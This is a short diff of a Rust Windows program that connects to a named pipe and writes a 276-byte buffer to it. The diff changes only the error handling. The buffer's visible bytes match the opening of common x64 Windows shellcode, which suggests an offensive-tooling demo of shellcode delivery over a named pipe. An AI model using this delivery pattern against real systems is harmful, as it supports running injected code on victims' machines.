@@ -8,7 +8,7 @@ use windows::{
     },
 };
 
-fn main() {
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         let h_file = CreateFileA(
             s!("\\\\.\\pipe\\Teste"),
@@ -18,7 +18,7 @@ fn main() {
             OPEN_EXISTING,
             FILE_FLAGS_AND_ATTRIBUTES(0),
             None,
-        ).unwrap_or_else(|e| panic!("[!] CreateFileA Failed With Error: {e}"));
+        )?;
 
         let buffer_write: [u8; 276] = [
             0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
@@ -44,8 +44,10 @@ fn main() {
         ];
 
         let mut number_return = 0;
-        WriteFile(h_file, Some(&buffer_write), Some(&mut number_return), None).unwrap_or_else(|e| panic!("[!] WriteFile Failed With Error: {e}"));
+        WriteFile(h_file, Some(&buffer_write), Some(&mut number_return), None)?;
 
-        CloseHandle(h_file);
+        CloseHandle(h_file)?;
     }
+
+    Ok(())
 }
